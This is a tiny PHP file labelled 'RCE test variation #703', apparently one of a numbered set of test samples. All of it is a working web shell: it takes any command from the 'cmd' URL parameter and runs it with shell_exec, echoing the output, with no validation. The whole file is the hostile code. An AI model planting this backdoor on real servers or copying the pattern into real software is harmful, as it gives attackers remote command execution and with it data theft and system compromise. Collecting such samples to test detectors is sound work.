<?php
// RCE test variation #703
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>